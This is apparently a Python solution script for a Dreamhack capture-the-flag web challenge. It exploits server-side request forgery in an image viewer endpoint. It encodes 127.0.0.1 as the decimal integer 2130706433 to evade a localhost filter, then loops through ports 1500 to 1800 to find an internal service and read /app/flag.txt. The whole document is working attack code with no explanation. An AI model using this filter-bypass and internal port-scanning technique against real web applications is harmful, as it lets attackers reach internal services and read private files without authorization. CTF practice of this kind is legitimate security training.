import requests

BASE_URL = 'http://host3.dreamhack.games:8510/img_viewer'


pre_res = ''
for port in range(1500, 1800+1):
	data = {'url': f"http://2130706433:{port}/app/flag.txt"}
	res = requests.post(BASE_URL, data=data)
	print(port)
	if port == 1500:
		pre_res = res.text
		continue
	if pre_res != res.text:
		print("find! port:", port)
		break
	else:
		pre_res = res.text

